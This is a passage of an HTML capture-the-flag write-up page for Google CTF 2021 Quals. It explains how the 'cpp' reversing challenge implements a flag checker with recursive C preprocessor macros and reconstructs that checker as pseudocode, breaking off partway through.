<!DOCTYPE HTML>
<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Google CTF 2021 Quals</title>
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">balsn / ctf_writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
        
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#cpp">cpp</a>
    
                <a class="dropdown-item" href="#polymorph">polymorph</a>
    
                <a class="dropdown-item" href="#hexagon">hexagon</a>
    
                <a class="dropdown-item" href="#adspam">adspam</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#raiders-of-corruption">raiders-of-corruption</a>
    
                <a class="dropdown-item" href="#abc-arm-and-amd">abc-arm-and-amd</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#ebpf">ebpf</a>
    
                <a class="dropdown-item" href="#fullchain">fullchain</a>
    
                <a class="dropdown-item" href="#memsafety">memsafety</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#letschat">letschat</a>
    
                <a class="dropdown-item" href="#gpushop">gpushop</a>
    
                <a class="dropdown-item" href="#secdriven">secdriven</a>
    
                <a class="dropdown-item" href="#empty-ls">empty-ls</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#pythia">pythia</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#cpp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">cpp</span>
            </a>
    
<a href="#polymorph" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">polymorph</span>
            </a>
    
<a href="#hexagon" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">hexagon</span>
            </a>
    
<a href="#adspam" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">adspam</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#raiders-of-corruption" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">raiders-of-corruption</span>
            </a>
    
<a href="#abc-arm-and-amd" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">abc-arm-and-amd</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#ebpf" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ebpf</span>
            </a>
    
<a href="#fullchain" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">fullchain</span>
            </a>
    
<a href="#memsafety" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">memsafety</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#letschat" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">letschat</span>
            </a>
    
<a href="#gpushop" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">gpushop</span>
            </a>
    
<a href="#secdriven" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">secdriven</span>
            </a>
    
<a href="#empty-ls" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">empty-ls</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#pythia" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">pythia</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="google-ctf-2021-quals"><a class="header-link" href="#google-ctf-2021-quals"></a>Google CTF 2021 Quals</h1>

<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
<h3 id="cpp"><a class="header-link" href="#cpp"></a>cpp</h3>
<p>The file cpp.c is a c source code file with lots of macro, the goal is to define the macro <code>FLAG_0</code> ~ <code>FLAG_20</code> with correct characters to pass the flag check. The logic of flag checker and the execution flow are implemented by the macro, the abstract of each blocks of macro is as following:</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __INCLUDE_LEVEL__ == 0</span>
<span class="hljs-comment">//define FLAG</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 0</span>
<span class="hljs-comment">//define ROM bits</span>
<span class="hljs-comment">//copy FLAG to ROM</span>
<span class="hljs-comment">//define l, MA, _MA, LD, _LD for memory operation</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __INCLUDE_LEVEL__ &gt; 12</span>
<span class="hljs-comment">//main logic of flag checker</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S != -1</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;cpp.c&quot;</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S != -1</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;cpp.c&quot;</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __INCLUDE_LEVEL__ == 0</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S != -1</span>
        <span class="hljs-meta">#<span class="hljs-meta-keyword">error</span> <span class="hljs-meta-string">&quot;Failed to execute program&quot;</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Key valid. Enjoy your program!\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2+2 = %d\n&quot;</span>, <span class="hljs-number">2</span>+<span class="hljs-number">2</span>);
    }
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
</code></pre><p>The macro <code>__INCLUDE_LEVEL__</code> represents the depth of nesting <code>#include</code> and starts out at 0. The <code>cpp.c</code> recursivly include itself until the depth is greater than 12, then it start to execute the main logic of flag checker.</p>
<p>The <code>S</code> is used to indicate the program state of flag checker. If the flag is correct, we&#39;ll see the output, <code>Key valid. Enjoy your program!</code>.</p>
<p>The control flow of the flag checker is as following:</p>
<p class="img-container"><img src="https://i.imgur.com/hmZ2zlF.jpg" alt=""></p>
<p>The $S_{i}$ represent the code block of <code>#if S == i</code>. There are only few types of operation in the flag checker:</p>
<ul class="list">
<li>Jump to the next state and the number S of the destination state is not the current S + 1, such as $S_0$</li>
</ul>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S == 0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> S</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> S</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 24</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
</code></pre><ul class="list">
<li>Set a variable to it&#39;s ones&#39; complement, such as $S_1$</li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">// R = !R (R0 is the lowest bit of R)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S == 1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> S</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 2</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> R0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> R0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> R0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> R1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> R1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
...
</code></pre><ul class="list">
<li>Assign value to a variable, such as $S_2$</li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">// Z = 1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S == 2</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> S</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 3</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Z0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z2</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z3</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z4</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z5</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z6</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> Z7</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
</code></pre><ul class="list">
<li>Add operation, such as $S_3$</li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">// R += Z</span>
<span class="hljs-keyword">if</span> S == <span class="hljs-number">3</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> S</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 4</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> c</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> R0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> Z0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> c</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> R0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> c</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> c</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> R0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> c</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
...
</code></pre><ul class="list">
<li>Branch, such as $S_7$</li>
<li>Copy a value from variable to another, such as $S_{15}$</li>
<li>And operation, such as $S_{16}$</li>
<li>Read value from ROM, such as $S_{45}$</li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">// C = ROM[B]</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> S == 45</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> S</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S 46</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> l0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> B0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> l0 1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> l0 0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> l1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> B1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> l1 1</span>
...
</code></pre><ul class="list">
<li>Xor operation, such as $S_{46}$</li>
<li>Or operation, such as $S_{52}$</li>
</ul>
<p>The pseudo code of flag checker:</p>
<pre class="hljs"><code><span class="hljs-attribute">ROM</span> = {<span class="hljs-number">0</span>: <span class="hljs-number">187</span>,<span class="hljs-number">1</span>: <span class="hljs-number">85</span>,<span class="hljs-number">2</span>: <span class="hljs-number">171</span>,<span class="hljs-number">3</span>: <span class="hljs-number">197</span>,<span class="hljs-number">4</span>: <span class="hljs-number">185</span>,<span class="hljs-number">5</span>: <span class="hljs-number">157</span>,<span class="hljs-number">6</span>: <span class="hljs-number">201</span>,<span class="hljs-number">7</span>: <span class="hljs-number">105</span>,<span class="hljs-number">8</span>: <span class="hljs-number">187</span>,<span class="hljs-number">9</span>: <span class="hljs-number">55</span>,<span class="hljs-number">10</span>: <span class="hljs-number">217</span>,<span class="hljs-number">11</span>: <span class="hljs-number">205</span>,<span class="hljs-number">12</span>: <span class="hljs-number">33</span>,<span class="hljs-number">13</span>: <span class="hljs-number">179</span>,<span class="hljs-number">14</span>: <span class="hljs-number">207</span>,<span class="hljs-number">15</span>: <span class="hljs-number">207</span>,<span class="hljs-number">16</span>: <span class="hljs-number">159</span>,<span class="hljs-number">17</span>: <span class="hljs-number">9</span>,<span class="hljs-number">18</span>: <span class="hljs-number">181</span>,<span class="hljs-number">19</span>: <span class="hljs-number">61</span>,<span class="hljs-number">20</span>: <span class="hljs-number">235</span>,<span class="hljs-number">21</span>: <span class="hljs-number">127</span>,<span class="hljs-number">22</span>: <span class="hljs-number">87</span>,<span class="hljs-number">23</span>: <span class="hljs-number">161</span>,<span class="hljs-number">24</span>: <span class="hljs-number">235</span>,<span class="hljs-number">25</span>: <span class="hljs-number">135</span>,<span class="hljs-number">26</span>: <span class="hljs-number">103</span>,<span class="hljs-number">27</span>: <span class="hljs-number">35</span>,<span class="hljs-number">28</span>: <span class="hljs-number">23</span>,<span class="hljs-number">29</span>: <span class="hljs-number">37</span>,<span class="hljs-number">30</span>: <span class="hljs-number">209</span>,<span class="hljs-number">31</span>: <span class="hljs-number">27</span>,<span class="hljs-number">32</span>: <span class="hljs-number">8</span>,<span class="hljs-number">33</span>: <span class="hljs-number">100</span>,<span class="hljs-number">34</span>: <span class="hljs-number">100</span>,<span class="hljs-number">35</span>: <span class="hljs-number">53</span>,<span class="hljs-number">36</span>: <span class="hljs-number">145</span>,<span class="hljs-number">37</span>: <span class="hljs-number">100</span>,<span class="hljs-number">38</span>: <span class="hljs-number">231</span>,<span class="hljs-number">39</span>: <span class="hljs-number">160</span>,<span class="hljs-number">40</span>: <span class="hljs-number">6</span>,<span class="hljs-number">41</span>: <span class="hljs-number">170</span>,<span class="hljs-number">42</span>: <span class="hljs-number">221</span>,<span class="hljs-number">43</span>: <span class="hljs-number">117</span>,<span class="hljs-number">44</span>: <span class="hljs-number">23</span>,<span class="hljs-number">45</span>: <span class="hljs-number">157</span>,<span class="hljs-number">46</span>: <span class="hljs-number">109</span>,<span class="hljs-number">47</span>: <span class="hljs-number">92</span>,<span class="hljs-number">48</span>: <span class="hljs-number">94</span>,<span class="hljs-number">49</span>: <span class="hljs-number">25</span>,<span class="hljs-number">50</span>: <span class="hljs-number">253</span>,<span class="hljs-number">51</span>: <span class="hljs-number">233</span>,<span class="hljs-number">52</span>: <span class="hljs-number">12</span>,<span class="hljs-number">53</span>: <span class="hljs-number">249</span>,<span class="hljs-number">54</span>: <span class="hljs-number">180</span>,<span class="hljs-number">55</span>: <span class="hljs-number">131</span>,<span class="hljs-number">56</span>: <span class="hljs-number">134</span>,<span class="hljs-number">57</span>: <span class="hljs-number">34</span>,<span class="hljs-number">58</span>: <span class="hljs-number">66</span>,<span class="hljs-number">59</span>: <span class="hljs-number">30</span>,<span class="hljs-number">60</span>: <span class="hljs-number">87</span>,<span class="hljs-number">61</span>: <span class="hljs-number">161</span>,<span class="hljs-number">62</span>: <span class="hljs-number">40</span>,<span class="hljs-number">63</span>: <span class="hljs-number">98</span>,<span class="hljs-number">64</span>: <span class="hljs-number">250</span>,<span class="hljs-number">65</span>: <span class="hljs-number">123</span>,<span class="hljs-number">66</span>: <span class="hljs-number">27</span>,<span class="hljs-number">67</span>: <span class="hljs-number">186</span>,<span class="hljs-number">68</span>: <span class="hljs-number">30</span>,<span class="hljs-number">69</span>: <span class="hljs-number">180</span>,<span class="hljs-number">70</span>: <span class="hljs-number">179</span>,<span class="hljs-number">71</span>: <span class="hljs-number">88</span>,<span class="hljs-number">72</span>: <span class="hljs-number">198</span>,<span class="hljs-number">73</span>: <span class="hljs-number">243</span>,<span class="hljs-number">74</span>: <span class="hljs-number">140</span>,<span class="hljs-number">75</span>: <span class="hljs-number">144</span>,<span class="hljs-number">76</span>: <span class="hljs-number">59</span>,<span class="hljs-number">77</span>: <span class="hljs-number">186</span>,<span class="hljs-number">78</span>: <span class="hljs-number">25</span>,<span class="hljs-number">79</span>: <span class="hljs-number">110</span>,<span class="hljs-number">80</span>: <span class="hljs-number">206</span>,<span class="hljs-number">81</span>: <span class="hljs-number">223</span>,<span class="hljs-number">82</span>: <span class="hljs-number">241</span>,<span class="hljs-number">83</span>: <span class="hljs-number">37</span>,<span class="hljs-number">84</span>: <span class="hljs-number">141</span>,<span class="hljs-number">85</span>: <span class="hljs-number">64</span>,<span class="hljs-number">86</span>: <span class="hljs-number">128</span>,<span class="hljs-number">87</span>: <span class="hljs-number">112</span>,<span class="hljs-number">88</span>: <span class="hljs-number">224</span>,<span class="hljs-number">89</span>: <span class="hljs-number">77</span>,<span class="hljs-number">90</span>: <span class="hljs-number">28</span>}

<span class="hljs-attribute">flag</span> = &#x27;CTF{write_flag_here_please}&#x27;
<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">27</span>):
    <span class="hljs-attribute">ROM</span>[<span class="hljs-number">128</span>+i] = flag[i]
<span class="hljs-comment"># all int are int8</span>
<span class="hljs-comment"># 24~28</span>
<span class="hljs-attribute">I</span> = <span class="hljs-number">0</span>
<span class="hljs-attribute">M</span> = <span class="hljs-number">0</span>
<span class="hljs-attribute">N</span> = <span class="hljs-number">1</span>
<span class="hljs-attribute">P</span> = <span class="hljs-number">0</span>
<span class="hljs-attribute">Q</span> = <span class="hljs-number">0</span>


<span class="hljs-comment"># 29~31</span>
<span class="hljs-attribute">while</span> I + <span class="hljs-number">0</span>b<span class="hljs-number">11100101</span> != <span class="hljs-number">0</span>:
    <span class="hljs-comment">#32</span>
    <span class="hljs-attribute">B</span> = <span class="hljs-number">128</span>
    <span class="hljs-comment"># 33</span>
    <span class="hljs-attribute">B</span> += I 
    <span class="hljs-comment"># 34</span>
    <span class="hljs-attribute">l</span> = B
    <span class="hljs-attribute">A</span> = ROM[l]
    <span class="hljs-comment">#35</span>
    <span class="hljs-attribute">l</span> = I 
    <span class="hljs-attribute">B</span> = ROM[l]
    <span class="hljs-comment">#36</span>
    <span class="hljs-attribute">R</span> = <span class="hljs-number">1</span>
    <span class="hljs-comment">#12 13</span>
    <span class="hljs-attribute">X</span> = <span class="hljs-number">1</span>
    <span class="hljs-attribute">Y</span> = <span class="hljs-number">0</span>
    <span class="hljs-comment">#14</span>
    <span class="hljs-attribute">while</span> X != <span class="hljs-number">0</span>:
        <span class="hljs-comment">#15</span>
        <span class="hljs-attribute">Z</span> = X
        <span class="hljs-comment">#16</span>
        <span class="hljs-attribute">Z</span> &amp;= B
        <span class="hljs-comment">#17</span>
        <span class="hljs-attribute">if</span> Z != <span class="hljs-number">0</span>:
            <span class="hljs-comment">#18</span>
            <span class="hljs-attribute">Y</span> += A
        <span class="hljs-comment">#19</span>
        <span class="hljs-attribute">X</span> *= <span class="hljs-number">2</span>
        <span class="hljs-comment">#20</span>
        <span class="hljs-attribute">A</span> *= <span class="hljs-number">2</span>
    <span class="hljs-comment">#22</span>
    <span class="hljs-attribute">A</span> = Y
    <span class="hljs-comment">#1</span>
    <span class="hljs-attribute">R</span> = !R
    <span class="hljs-comment">#2</span>
    <span class="hljs-attribute">Z</span> = <span class="hljs-number">1</span>
    <span class="hljs-comment">#3 #4</span>
    <span class="hljs-attribute">R</span> += <span class="hljs-number">2</span>*Z
    <span class="hljs-comment">#5</span>
    <span class="hljs-attribute">if</span> R == <span class="hljs-number">0</span>: 
        <span class="hljs-comment"># 38</span>
        <span class="hljs-attribute">O</span> = M
        <span class="hljs-comment"># 39</span>
        <span class="hljs-attribute">O</span> += N
        <span class="hljs-comment"># 40</span>
        <span class="hljs-attribute">M</span> = N
        <span class="hljs-comment"># 41</span>
        <span class="hljs-attribute">N</span> = O
        <span class="hljs-comment">#42</span>
        <span class="hljs-attribute">A</span> += M
        <span class="hljs-comment">#43</span>
        <span class="hljs-attribute">B</span> = <span class="hljs-number">0</span>b<span class="hljs-number">00100000</span>
        <span class="hljs-comment">#44</span>
        <span class="hljs-attribute">B</span> += I
        <span class="hljs-comment">#45</span>
        <span class="hljs-attribute">l</span> = B
        <span class="hljs-attribute">C</span> = ROM[l]
        <span class="hljs-comment">#46</span>
        <span class="hljs-attribute">A</span> ^= C
        <span class="hljs-comment">#47</span>
        <span class="hljs-attribute">P</span> += A
        <span class="hljs-comment">#48</span>
        <span class="hljs-attribute">B</span> = <span class="hljs-number">0</span>b<span class="hljs-number">01000000</span>
        <span class="hljs-comment">#49</span>
        <span class="hljs-attribute">B</span> += I
        <span class="hljs-comment">#50</span>
        <span class="hljs-attribute">l</span> = B
        <span class="hljs-attribute">A</span> = ROM[l]
        <span class="hljs-comment">#51</span>
        <span class="hljs-attribute">A</span> ^= P
        <span class="hljs-comment">#52</span>
        <span class="hljs-attribute">Q</span> |= A
        <span class="hljs-comment">#53</span>
        <span class="hljs-attribute">A</span> = <span class="hljs-number">1</span>
        <span class="hljs-comment">#54</span>
        <span class="hljs-attribute">I</span> += A
    <span class="hljs-attribute">else</span>:
        <span class="hljs-comment">#6</span>
        <span class="hljs-attribute">R</span> += Z
        <span class="hljs-comment">#7</span>
        <span class="hljs-attribute">if</span> R == <span class="hljs-number">0</span>:
            <span class="hljs-comment"># 59</span>
            <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Failed to execute program&quot;</span>)
            <span class="hljs-attribute">break</span>
        <span class="hljs-attribute">else</span>:
            <span class="hljs-comment">#8</span>
            <span class="hljs-attribute">R</span> += Z
            <span class="hljs-comment">#9</span>
            <span class="hljs-attribute">if</span> R == <span class="hljs-number">0</span>:
                <span class="hljs-comment"># 59</span>
                <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Failed to execute program&quot;</span>)
                <span class="hljs-attribute">break</span>
            <span class="hljs-attribute">else</span>:
                <span class="hljs-comment">#10</span>
